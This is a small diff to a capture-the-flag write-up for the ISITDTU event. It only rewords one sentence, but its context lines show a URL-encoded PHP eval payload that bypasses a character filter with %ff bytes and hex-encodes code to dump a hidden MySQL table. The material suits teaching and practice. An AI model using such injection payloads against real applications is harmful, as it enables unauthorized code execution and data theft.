@@ -156,7 +156,7 @@ Keeping this bypass in mind, we can then run the following command after url enc
 p%ffhp+-r+ev%ffal(s%ffubst%ffr(hex2bin(aa2463203d206e6577206d7973716c6928276462272c2027726f6f74272c202774657374272c2027646f636b65724578616d706c6527293b0a2472203d2024632d3e7175657279282753454c454354202a2046524f4d205468655f7461626c655f796f755f646f6e745f6b6e6f7727293b0a7768696c6520282477203d2024722d3e66657463685f6173736f63282929207b0a202020207072696e745f72282477293b0a7d0a),1))%3b
 ```
 
-We can then run this command in the url, and we get the flag:
+We can then run this command inside the url, and we get the flag:
 ![](https://i.imgur.com/DQQFSws.png)
 
 Even though I struggled, I learned a lot, and I had a lot of fun. I hope you enjoyed this writeup, and thank you to the ISITDTU team for hosting this CTF. See you next year!
